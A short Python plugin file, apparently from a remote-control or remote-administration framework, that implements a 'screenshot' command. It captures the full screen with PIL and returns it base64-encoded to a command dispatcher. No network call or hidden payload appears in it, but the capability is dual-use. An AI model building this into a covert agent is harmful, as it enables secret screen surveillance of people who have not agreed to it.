"""截图模块 - 精简版不包含"""

from modules.api import ModuleBase


class ScreenshotModule(ModuleBase):
    @property
    def name(self):
        return "screenshot"

    @property
    def description(self):
        return "屏幕截图模块"

    @property
    def author(self):
        return "帅丘"

    @property
    def version(self):
        return "2.0.0"

    def handle(self, cmd):
        t = cmd.get("type")
        p = cmd.get("payload")

        if t == "screenshot":
            return self._screenshot(p)
        else:
            return {"status": "error", "result": f"Unknown command: {t}", "result_type": "error"}

    def get_commands(self):
        return ["screenshot"]

    def _screenshot(self, payload):
        try:
            from PIL import ImageGrab
            import base64
            import tempfile
            import os

            img = ImageGrab.grab()
            with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as f:
                img.save(f.name)
                data = base64.b64encode(open(f.name, "rb").read()).decode()
            os.remove(f.name)
            return {"status": "ok", "result": data, "filename": "shot.png", "result_type": "screenshot"}
        except ImportError:
            return {"status": "error", "result": "PIL not installed", "result_type": "error"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}


module = ScreenshotModule()
